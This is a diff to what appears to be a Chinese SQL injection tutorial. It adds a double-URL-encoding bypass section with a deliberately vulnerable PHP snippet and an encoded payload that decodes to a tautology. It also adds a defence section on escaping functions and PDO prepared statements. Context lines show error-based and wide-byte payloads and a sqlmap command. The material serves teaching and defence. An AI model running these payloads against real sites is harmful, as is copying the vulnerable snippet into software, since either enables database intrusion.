@@ -396,7 +396,9 @@ id=1' and linestring((select * from(select * from(select user())a)b)) -- -
 
 
 
-## 0x07 宽字节注入
+## 0x07 编码注入
+
+#### 1. 宽字节注入
 
 GBK占用两字节，ASCII占用一字节，PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。
 
@@ -422,6 +424,33 @@ sqlmap -u "http://xxx.com/xxx.php?id=1" --tamper=unmagicquotes.py --dbs
 
 ```
 id=1%bf' union selelct 1,2,3 -- -
+```
+
+#### 2. 二次URL编码注入
+
+如果后台在用户输入的数据入库之前做了一次URL解码，那就注入攻击时就需要二次URL编码，一次是给WebServer正常解码，另一次就是给后台URL解码用的。
+
+php中如果使用了urldecode或rawurldecode函数来解码，那么就需要二次URL编码注入。后台代码示例如下：
+
+```php
+<?php
+$a=addslashes($_GET['id']);
+$b=urldecode($a);
+echo '$a='.$a;
+echo '<br />';
+echo '$b='.$b;
+//后面入库代码省略
+?>
+```
+
+代码先对\'、\"、\\、Null等符号做了转义，然后URL解码。那么我们只需要注入下面代码即可绕过addslashes转义和urlencode编码：
+
+```
+id=%2531%2527%2520%256f%2572%2520%2527%2531%2527%253d%2527%2531
+# 经过WebServer自动解码后
+id=%31%27%20%6f%72%20%27%31%27%3d%27%31
+# 经过后台urldecode函数后
+id=1' or '1'='1
 ```
 
 
@@ -816,3 +845,42 @@ select * from information_schema limit 20\G;`
 ```
 
 limit 20 是限制了只取20条记录，\\G转化成容易看的形式。
+
+
+
+## 0x0f SQL注入防御
+
+#### 1. php配置层面的防御
+
+- 使用**magic_quotes_gpc**函数对GET、POST、Cookie的值进行过滤。
+
+- 使用**magic_quotes_runtime**函数对从数据库或者文件中获取的数据进行过滤。
+
+但是上面这两个函数值对\'、\"、\\、Null四个字符进行过滤，所以对于数值型注入是没有多大用处的。
+
+在php4.2.3及以前的版本可以在任何地方设置开启（配置文件、代码中），之后的版本可以在php.ini、httpd.conf以及.htaccess中开启。
+
+#### 2. 过滤函数和类
+
+通常在程序入口处统一过滤，或者在SQL语句运行之前使用。
+
+- 使用**addslashes**函数对变量进行过滤，同样只会对\'、\"、\\、Null四个字符进行过滤。
+
+- 使用**mysql_real_escape_string**函数和**mysql_escape_string**函数，对\\x00、\\n、\\r、\\、\\'、\\"、\\x1a等字符进行过滤，推荐使用mysql_real_escape_string函数，因为其会根据当前字符集转义字符串。
+
+- 使用**intval**、**floatval**等函数进行字符类型转换，将变量转换成int类型、float类型等。
+
+#### 3. PDO prepare预编译
+
+```php
+<?php
+$db = new PDO("mysql:host=localhost; dbname=test", "user", "pass");
+$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
+$db->exec("set names 'utf8'");
+$sql="select * from test where name = ? and password = ?";
+$stmt = $db->prepare($sql);
+$res = $stmt->execute(array($name, $pass));
+?>
+```
+
+其中，setAttribute设置ATTR_EMULATE_PREPARES为false，是因为php在5.3.6版本之前是使用了php本地模拟prepare后，再把完整的SQL语句发给MySQL服务器。在这种情况下如果设置GBK编码，则存在宽字节注入。因此需要禁用php本地模拟prepare。
